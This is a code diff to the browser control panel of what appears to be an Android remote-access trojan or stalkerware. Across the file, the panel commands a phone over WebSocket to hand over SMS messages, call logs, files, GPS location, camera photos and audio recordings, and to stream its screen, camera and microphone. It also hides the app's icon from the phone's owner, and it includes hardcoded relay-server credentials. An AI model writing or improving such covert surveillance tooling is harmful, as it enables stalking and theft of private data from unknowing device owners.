@@ -513,13 +513,16 @@
     let currentPage = 0;
     let dataType = null;
     let currentPath = "root";
-    let selectedFiles = [];          // will store objects { path, name }
+    let selectedFiles = [];
     let screenActive = false;
     let iconHidden = false;
 
     // Live camera recording state
     let mediaRecorder = null;
     let recordedChunks = [];
+
+    // Track the last command sent to interpret raw responses
+    let pendingCommand = null;
 
     const panel = document.getElementById('main-panel');
     const statusEl = document.getElementById('status');
@@ -533,7 +536,7 @@
         { urls: "turns:standard.relay.metered.ca:443?transport=tcp", username: "dc05b4f4ae8aaae1fff19747", credential: "OrIiLL1BH86B17iP" }
     ];
 
-    // ---------- FIREBASE SIGNALING HELPERS (unchanged) ----------
+    // ---------- FIREBASE SIGNALING HELPERS ----------
     async function createWebRTCRoom(offerSdp, streamType) {
         const roomId = 'room_' + Date.now() + '_' + Math.random().toString(36).substring(7);
         const roomData = {
@@ -689,7 +692,7 @@
         else if (type === 'audio') audioPC = pc;
     }
 
-    // ---------- PEER CONNECTION CREATORS (unchanged) ----------
+    // ---------- PEER CONNECTION CREATORS ----------
     function createPeerConnection(streamType) {
         const pc = new RTCPeerConnection({ iceServers: ICE_SERVERS });
         pc.ontrack = (e) => {
@@ -724,7 +727,7 @@
         return pc;
     }
 
-    // ---------- SCREEN SHARE (unchanged) ----------
+    // ---------- SCREEN SHARE ----------
     async function toggleScreen() {
         if (screenActive) {
             // Stop screen share
@@ -762,7 +765,7 @@
         }
     }
 
-    // ---------- LIVE CAMERA (unchanged) ----------
+    // ---------- LIVE CAMERA ----------
     async function startLiveStream() {
         const camera = document.querySelector('input[name="liveCameraSelect"]:checked').value;
         const useFlash = document.getElementById('liveFlashCheckbox').checked;
@@ -809,7 +812,7 @@
         panel.innerHTML = 'Ready.';
     }
 
-    // ---------- LIVE AUDIO (unchanged) ----------
+    // ---------- LIVE AUDIO ----------
     async function toggleLiveAudio() {
         if (audioPC) {
             stopLiveAudio();
@@ -854,7 +857,7 @@
         panel.innerHTML = 'Ready.';
     }
 
-    // ---------- JOIN ROOM (when Android creates room) (unchanged) ----------
+    // ---------- JOIN ROOM (when Android creates room) ----------
     async function joinFirebaseRoom(roomId) {
         const roomRef = doc(db, "rooms", roomId);
         const roomSnap = await getDoc(roomRef);
@@ -917,9 +920,13 @@
         };
         ws.send(JSON.stringify(payload));
         panel.innerHTML = `📤 Command sent: ${command}`;
+        // Set pending command for response handling
+        pendingCommand = command;
+        // Clear after 10 seconds in case no response
+        setTimeout(() => { if (pendingCommand === command) pendingCommand = null; }, 10000);
     }
 
-    // ---------- PLAIN TEXT SENDING (for hideApp/showApp) ----------
+    // ---------- PLAIN TEXT SENDING (for hideApp/showApp and file downloads) ----------
     function sendPlainText(msg) {
         if (!ws || ws.readyState !== WebSocket.OPEN) {
             panel.innerHTML = `<div style="color:#d32f2f;">⚠ WebSocket not connected. Click reconnect.</div>`;
@@ -929,173 +936,182 @@
         panel.innerHTML = `📤 Plain text sent: ${msg}`;
     }
 
-    // ---------- HELPER: Extract array data from JSON ----------
-    function extractDataArray(json) {
-        if (Array.isArray(json)) return json;
-        if (json.data && Array.isArray(json.data)) return json.data;
-        if (json.smsList && Array.isArray(json.smsList)) return json.smsList;
-        if (json.messages && Array.isArray(json.messages)) return json.messages;
-        if (json.files && Array.isArray(json.files)) return json.files;
-        if (json.logs && Array.isArray(json.logs)) return json.logs;
-        if (json.items && Array.isArray(json.items)) return json.items;
-        if (json.list && Array.isArray(json.list)) return json.list;
-        return null;
-    }
-
     // ---------- PLAIN TEXT / JSON HANDLERS ----------
     function handleJSON(json) {
         console.log('handleJSON:', json.type, json);
         switch (json.type) {
             case 'SMS_DATA':
-                console.log('📩 SMS_DATA received', json);
+                console.log('📩 SMS_DATA received', json.data);
                 dataType = 'sms';
-                currentData = extractDataArray(json) || json.data || json;
-                if (!Array.isArray(currentData)) currentData = [];
+                currentData = json.data;
                 renderTable();
+                pendingCommand = null;
                 break;
             case 'CALL_LOGS':
                 dataType = 'call';
-                currentData = extractDataArray(json) || json.data || json;
-                if (!Array.isArray(currentData)) currentData = [];
+                currentData = json.data;
                 renderTable();
+                pendingCommand = null;
                 break;
             case 'FILE_LIST':
                 dataType = 'file';
-                currentData = extractDataArray(json) || json.data || json;
-                if (!Array.isArray(currentData)) currentData = [];
+                currentData = json.data;
                 renderFiles();
+                pendingCommand = null;
                 break;
             case 'LOCATION_UPDATE':
-                renderMap(json.data || json);
+                renderMap(json.data);
+                pendingCommand = null;
                 break;
             case 'CAMERA_IMAGE':
-                displayCapturedImage(json.data || json);
+                displayCapturedImage(json.data);
+                pendingCommand = null;
                 break;
             case 'AUDIO_RECORDING':
-                showAudio(json.data || json);
-                break;
-            case 'FILE_DATA':   // <-- NEW: handle JSON file data
-                // Expected format: { base64: "...", filename: "..." }
-                if (json.base64) {
-                    downloadBase64(json.base64, json.filename || 'downloaded_file');
-                } else if (json.data && json.data.base64) {
-                    downloadBase64(json.data.base64, json.data.filename || 'downloaded_file');
-                }
+                showAudio(json.data);
+                pendingCommand = null;
                 break;
             case 'ERROR':
                 panel.innerHTML = `<div style="color:#d32f2f;">Error: ${json.error}</div>`;
+                pendingCommand = null;
                 break;
             case 'DEVICE_STATUS':
                 setStatus(json.status);
+                pendingCommand = null;
                 break;
             case 'APP_HIDDEN':
                 iconHidden = true;
                 document.getElementById('iconBtn').innerText = 'Show Icon';
                 showNotification('App icon hidden');
+                pendingCommand = null;
                 break;
             case 'APP_SHOWN':
                 iconHidden = false;
                 document.getElementById('iconBtn').innerText = 'Hide Icon';
                 showNotification('App icon shown');
+                pendingCommand = null;
                 break;
             case 'SCREEN_SHARE_STARTED':
                 screenActive = true;
                 document.getElementById('screenBtn').innerText = 'Stop Screen';
                 showNotification('Screen share started');
+                pendingCommand = null;
                 break;
             case 'SCREEN_SHARE_STOPPED':
                 screenActive = false;
                 document.getElementById('screenBtn').innerText = 'Start Screen';
                 if (screenPC) { screenPC.close(); screenPC = null; }
                 showNotification('Screen share stopped');
+                pendingCommand = null;
                 break;
             case 'ROOM_CREATED':
                 // Android created a room, join it
                 if (json.roomId) joinFirebaseRoom(json.roomId);
+                pendingCommand = null;
                 break;
             default:
                 console.log('Unhandled JSON type:', json.type);
-                // Attempt to render anyway if it looks like data
-                if (Array.isArray(json)) {
-                    // Could be a direct array of SMS/call/files
-                    if (json.length > 0) {
-                        const first = json[0];
-                        if (first.body !== undefined) dataType = 'sms';
-                        else if (first.duration !== undefined) dataType = 'call';
-                        else if (first.isDir !== undefined) dataType = 'file';
-                        else dataType = 'unknown';
-                        currentData = json;
-                        if (dataType === 'file') renderFiles();
-                        else renderTable();
-                    }
+                // If we have a pending command, try to infer the response format
+                if (pendingCommand === 'LIST_FILES' && Array.isArray(json)) {
+                    dataType = 'file';
+                    currentData = json;
+                    renderFiles();
+                    pendingCommand = null;
+                } else if (pendingCommand === 'GET_SMS' && Array.isArray(json)) {
+                    dataType = 'sms';
+                    currentData = json;
+                    renderTable();
+                    pendingCommand = null;
+                } else if (pendingCommand === 'GET_CALL_LOGS' && Array.isArray(json)) {
+                    dataType = 'call';
+                    currentData = json;
+                    renderTable();
+                    pendingCommand = null;
+                } else if (pendingCommand === 'GET_LOCATION' && json.lat && json.lon) {
+                    renderMap(json);
+                    pendingCommand = null;
                 }
+                break;
         }
     }
 
     function handlePlainText(msg) {
         if (msg.startsWith("STATUS:")) {
             setStatus(msg.substring(7));
+            pendingCommand = null;
         } else if (msg.startsWith("LOC_DATA:")) {
             try {
                 const data = JSON.parse(msg.substring(9));
                 renderMap(data);
+                pendingCommand = null;
             } catch (err) { console.error(err); }
         } else if (msg.startsWith("FILE_LIST:")) {
             try {
                 currentData = JSON.parse(msg.substring(10));
                 dataType = 'file';
                 renderFiles();
+                pendingCommand = null;
             } catch (err) { console.error(err); }
         } else if (msg.startsWith("SMS_DATA:")) {
             try {
                 currentData = JSON.parse(msg.substring(9));
                 dataType = 'sms';
                 renderTable();
+                pendingCommand = null;
             } catch (err) { console.error(err); }
         } else if (msg.startsWith("CALL_DATA:")) {
             try {
                 currentData = JSON.parse(msg.substring(10));
                 dataType = 'call';
                 renderTable();
+                pendingCommand = null;
             } catch (err) { console.error(err); }
         } else if (msg.startsWith("CAMERA_IMAGE:")) {
             const base64 = msg.substring(13);
             displayCapturedImage(base64);
+            pendingCommand = null;
         } else if (msg.startsWith("AUDIO_RECORDING:")) {
             showAudio(msg.substring(16));
+            pendingCommand = null;
         } else if (msg.startsWith("SCREEN_SHARE_STARTED")) {
             screenActive = true;
             document.getElementById('screenBtn').innerText = 'Stop Screen';
             showNotification('Screen share started');
+            pendingCommand = null;
         } else if (msg.startsWith("SCREEN_SHARE_STOPPED")) {
             screenActive = false;
             document.getElementById('screenBtn').innerText = 'Start Screen';
             if (screenPC) { screenPC.close(); screenPC = null; }
             showNotification('Screen share stopped');
+            pendingCommand = null;
         } else if (msg.startsWith("APP_HIDDEN")) {
             iconHidden = true;
             document.getElementById('iconBtn').innerText = 'Show Icon';
             showNotification('App icon hidden');
+            pendingCommand = null;
         } else if (msg.startsWith("APP_SHOWN")) {
             iconHidden = false;
             document.getElementById('iconBtn').innerText = 'Hide Icon';
             showNotification('App icon shown');
+            pendingCommand = null;
         } else if (msg.startsWith("VIBRATE_DONE")) {
             showNotification('Vibration done');
+            pendingCommand = null;
         } else if (msg.startsWith("ERROR:")) {
             panel.innerHTML = `<div style="color:#d32f2f;">Error: ${msg.substring(6)}</div>`;
-        } else if (msg.startsWith("FILE_DATA:")) {   // <-- KEPT FOR COMPATIBILITY
+            pendingCommand = null;
+        } else if (msg.startsWith("FILE_DATA:")) {
             const base64 = msg.substring(10);
-            // Try to guess filename from path if available
-            let fname = 'downloaded_file';
-            if (selectedFiles.length > 0) {
-                const firstPath = selectedFiles[0];
-                if (firstPath) {
-                    const parts = firstPath.split('/');
-                    fname = parts[parts.length-1];
-                }
+            downloadBase64(base64, 'downloaded_file');
+            pendingCommand = null;
+        } else if (msg.startsWith('[') || msg.startsWith('{')) {
+            // Try to parse as JSON (raw response from device)
+            try {
+                const parsed = JSON.parse(msg);
+                handleJSON(parsed);
+            } catch (err) {
+                console.error('Failed to parse JSON in plain text:', err);
             }
-            downloadBase64(base64, fname);
         } else {
             console.log('Unhandled plain text:', msg);
         }
@@ -1114,7 +1130,7 @@
         }
     }
 
-    // ---------- CAMERA UI (unchanged) ----------
+    // ---------- CAMERA UI ----------
     function toggleCameraPanel(panelId) {
         const clickPanel = document.getElementById('clickCameraPanel');
         const livePanel = document.getElementById('liveCameraPanel');
@@ -1142,7 +1158,7 @@
         `;
     }
 
-    // ---------- LIVE STREAM ACTIONS (snapshot/record) (unchanged) ----------
+    // ---------- LIVE STREAM ACTIONS (snapshot/record) ----------
     function takeSnapshot() {
         const video = document.getElementById('liveCamVideo');
         if (!video || !video.videoWidth) {
@@ -1191,7 +1207,7 @@
         }
     }
 
-    // ---------- APP ICON TOGGLE (unchanged) ----------
+    // ---------- APP ICON TOGGLE ----------
     function toggleAppIcon() {
         if (iconHidden) sendPlainText('showApp');
         else sendPlainText('hideApp');
@@ -1205,7 +1221,6 @@
         `;
     }
 
-    // Updated downloadBase64 to accept filename
     function downloadBase64(b64, filename) {
         const a = document.createElement('a');
         a.href = 'data:application/octet-stream;base64,' + b64;
@@ -1319,10 +1334,8 @@
         if (!currentData || currentData.length === 0) {
             html += '<p style="padding:20px;">No files found.</p>';
         } else {
-            // Ensure currentData is an array of objects with isDir, name, path, size
-            const folders = currentData.filter(item => item.isDir === true);
+            const folders = currentData.filter(item => item.isDir);
             const files = currentData.filter(item => !item.isDir);
-            // Reset selected files when new list loads
             selectedFiles = [];
 
             html += `
@@ -1355,7 +1368,7 @@
                 const size = formatBytes(f.size);
                 html += `
                     <div class="file-item">
-                        <input type="checkbox" class="file-checkbox" data-path="${path}" data-name="${name}" onchange="updateSelected(this)">
+                        <input type="checkbox" class="file-checkbox" data-path="${path}" onchange="updateSelected(this)">
                         <span class="file-icon">📄</span>
                         <span class="file-name">${name}</span>
                         <span class="file-size">${size}</span>
@@ -1391,14 +1404,10 @@
 
     function updateSelected(checkbox) {
         const path = checkbox.dataset.path;
-        const name = checkbox.dataset.name;
         if (checkbox.checked) {
-            // store as object with path and name
-            if (!selectedFiles.some(f => f.path === path)) {
-                selectedFiles.push({ path, name });
-            }
+            if (!selectedFiles.includes(path)) selectedFiles.push(path);
         } else {
-            selectedFiles = selectedFiles.filter(f => f.path !== path);
+            selectedFiles = selectedFiles.filter(p => p !== path);
         }
         const downloadBtn = document.querySelector('.download-selected button');
         if (downloadBtn) {
@@ -1406,15 +1415,13 @@
         }
     }
 
-    // Updated downloadSelected: send JSON command instead of plain text
     function downloadSelected() {
         if (selectedFiles.length === 0) {
             alert('No files selected');
             return;
         }
-        selectedFiles.forEach(file => {
-            // Use JSON command so the server can respond with filename
-            sendCommand('DOWNLOAD_FILE', { path: file.path, name: file.name });
+        selectedFiles.forEach(path => {
+            sendPlainText('dl ' + path);
         });
     }
 
@@ -1440,31 +1447,13 @@
         ws = new WebSocket(WS_URL);
         ws.onopen = () => {
             console.log('WebSocket connected');
-            ws.send('I_AM_WEB');
+            // Send registration – adjust the format to match the server's expectation
+            ws.send('I_AM_WEB');  // or JSON.stringify({ type: 'register', role: 'web' })
             setStatus('ONLINE');
             panel.innerHTML = '✅ Connected to server. Ready.';
         };
-        ws.onmessage = async (e) => {
-            console.log('RAW message:', e.data);
-            // Handle binary (Blob) messages
-            if (e.data instanceof Blob) {
-                // Assume it's a file – convert to base64 and download
-                const reader = new FileReader();
-                reader.onload = () => {
-                    // result is a data URL: "data:application/octet-stream;base64,...."
-                    const base64 = reader.result.split(',')[1];
-                    // Use a generic name, maybe from a previous selected file?
-                    let fname = 'downloaded_file';
-                    if (selectedFiles.length > 0) {
-                        // Take the first selected file's name as guess
-                        fname = selectedFiles[0].name || 'downloaded_file';
-                    }
-                    downloadBase64(base64, fname);
-                };
-                reader.readAsDataURL(e.data);
-                return;
-            }
-
+        ws.onmessage = (e) => {
+            console.log('RAW message:', e.data);  // <-- add this
             const msg = e.data;
             if (msg.startsWith('{')) {
                 try {
